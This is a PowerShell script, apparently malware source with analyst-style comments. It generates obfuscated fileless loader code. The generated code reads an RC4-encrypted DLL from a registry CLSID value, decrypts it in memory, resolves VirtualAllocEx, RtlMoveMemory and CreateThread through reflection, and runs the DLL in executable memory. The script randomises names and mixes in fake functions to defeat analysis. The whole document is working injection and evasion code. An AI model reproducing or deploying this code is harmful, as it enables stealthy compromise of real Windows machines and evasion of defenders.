# INPUT PARAMS...
    # $bk5, string, hk(lm|cu):\software\classes\CLSID\<random_GUID_0>\VersionIndependentProgID
    # $gk4, string, last 4 characters of random_GUID_0
    # $qn0, string, first 4 characters of random_GUID_0
    # $um4, integer, 14044 if DLL is 64 bit, 11498 if 32 bit
    # $un4, integer, always 2
# OUTPUT...
    # returns a string containing powershell code that performs process injection using the DLL stored
    # in the registry key $bk5. powershell code is broken up into functions in the same format as cmd3.ps1
    # with random function and variable names. Fake functions that do not work are also inserted
    # intermixed with the real ones for anti-analysis.

$lk2 = "function do3{param(__arg1)[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(__arg1))}`n";

$kl0 = "function vb8{param(__arg1,__arg2)";
$oc4 = "__type=[AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('?RND?')),[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('?RND?',`$false).DefineType('?RND?','Class,Public,Sealed,AnsiClass,AutoClass',[System.MulticastDelegate]);__type.DefineConstructor('RTSpecialName,HideBySig,Public',[System.Reflection.CallingConventions]::Standard,__arg1).SetImplementationFlags('Runtime,Managed');__type.DefineMethod('Invoke','Public,HideBySig,NewSlot,Virtual',__arg2,__arg1).SetImplementationFlags('Runtime,Managed');__type.CreateType()";

$ap3 = "function yx4{param(__arg1)";
$hd5 = "__unsafe=([AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{`$_.GlobalAssemblyCache -and `$_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods');;__href=New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr),(__unsafe.GetMethod('GetModuleHandle').Invoke(0,@('kernel32.dll'))));;__unsafe.GetMethod('GetProcAddress',[reflection.bindingflags] 'Public,Static',`$null,[System.Reflection.CallingConventions]::Any,@((New-Object System.Runtime.InteropServices.HandleRef).GetType(),[string]),`$null).Invoke(`$null,@([System.Runtime.InteropServices.HandleRef]__href,__arg1))";

# $sy7=33
if($un4 -eq 1){
	$sy7=34
}
else{
	$sy7=33
}

$zg4 = "function ny1{param(__arg1,__arg2,__arg3)";
$no7 ="__bin=Get-ItemProperty -Path __arg1 -n __arg3|Select-Object -ExpandProperty __arg3;__size=(__bin[32]+"+(pz1 $sy7 3)+"); __key=__bin[__size..(__size+31)]; [array]::Reverse(__key);__bin=Get-ItemProperty -Path __arg1 -n __arg2|Select-Object -ExpandProperty __arg2;__size={ __rwx=0..255;0..255|%{ __off=(__off+__rwx[`$_]+__key[`$_%__key.Length])%" + (pz1 256 2) +"; __rwx[`$_],__rwx[__off]=__rwx[__off],__rwx[`$_] } ;__bin|%{__i=(__i+1)%" + (pz1 256 2) +"; __fb1=(__fb1+__rwx[__i])%" + (pz1 256 2) +"; __rwx[__i],__rwx[__fb1]=__rwx[__fb1],__rwx[__i];`$_-bxor__rwx[(__rwx[__i]+__rwx[__fb1])%" + (pz1 256 2) +"] } } ;__encbuf = (& __size|foreach-object{'{0:X2}' -f `$_ })-join ''; (`$(for(__i=0;__i -lt __encbuf.Length;__i+=2){ [convert]::ToByte(__encbuf.Substring(__i,2)," + (pz1 16 2) +") }))"

$ze4 = "function rt2{param(__bin,__pld_size,__rva_offset,__prot)";
$qi7 ="__rwx=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yx4 'VirtualAllocEx'),(vb8 @([IntPtr],[IntPtr],[IntPtr],[int],[int])([Intptr]))).invoke(-1,0,__pld_size,"+(pz1 0x3000 2)+",__prot);"+"[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yx4 'RtlMoveMemory'),(vb8 @([IntPtr],[byte[]],[UInt32])([Intptr]))).invoke(__rwx,__bin,__pld_size);"+"__rwx=New-Object System.Intptr -ArgumentList `$(__rwx.ToInt64()+__rva_offset);"+"[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((yx4 'CreateThread'),(vb8 @([IntPtr],[UInt32],[IntPtr],[IntPtr],[UInt32],[IntPtr])([Intptr]))).invoke(0,0,__rwx,0,0,0);"+"Start-Sleep -s "+(pz1 ((Get-Random 2048) + 2048) 2);

# first five elements are the function names in the function definitions hardcoded above, and
# the rest are placeholder variable names currently present in the corresponding function bodies
$cf0 = @('do3','vb8','yx4','ny1','rt2','__arg1','__arg2','__arg3','__bin','__rwx','__i','__type','__unsafe','__href','__size','__encbuf','__off','__key','__fb1','__pld_size','__rva_offset','__prot');
$lt9 = 5;

$cy4 =@();
$cy4 =rq1 $lt9 $cf0;

# these together are the mapping of function header to body
$mg3 = @( $kl0 , $ap3 , $zg4 );
$ab4 = @( $oc4 , $hd5 , $no7 );

$mj0 = @();

# build the above functions in the same format as the functions in cmd3.ps1 with new function
# and variable names
for( $fz4 =0; $fz4 -lt 3; $fz4++){
    $mj0 += (bi8 $mg3[$fz4] $ab4[$fz4] $cf0 $cy4) 
}

# shuffle the list randomly
$mj0=$mj0|Sort-Object{
	Get-Random
}

# encode another function ze4
$gv8 = bi8 $ze4 $qi7 $cf0 $cy4;

# build a bunch of FAKE functions that won't work intermixed in with the real ones
$ul4 = (pz0 3 $lt9 $mg3 $ab4 $cf0) +$lk2 +(pz0 3 $lt9 $mg3 $ab4 $cf0) +$mj0 +(pz0 3 $lt9 $mg3 $ab4 $cf0) + "__bin=ny1 (do3 '"+(de8 $bk5)+"') '"+$gk4+"' '"+$qn0+"';
" +(pz0 3 $lt9 $mg3 $ab4 $cf0) +$gv8 +(pz0 3 $lt9 $mg3 $ab4 $cf0) +("rt2 __bin __bin.length " + (pz1 $um4 2) + " " + (pz1 0x40 2));
$lc3=0;

# another pass to replace names for the new code we inserted (rt2, ny1, __bin)
foreach($fx9 in $cf0){
    $ul4=$ul4.Replace($fx9,$cy4[$lc3]);
    $lc3++
}

$ul4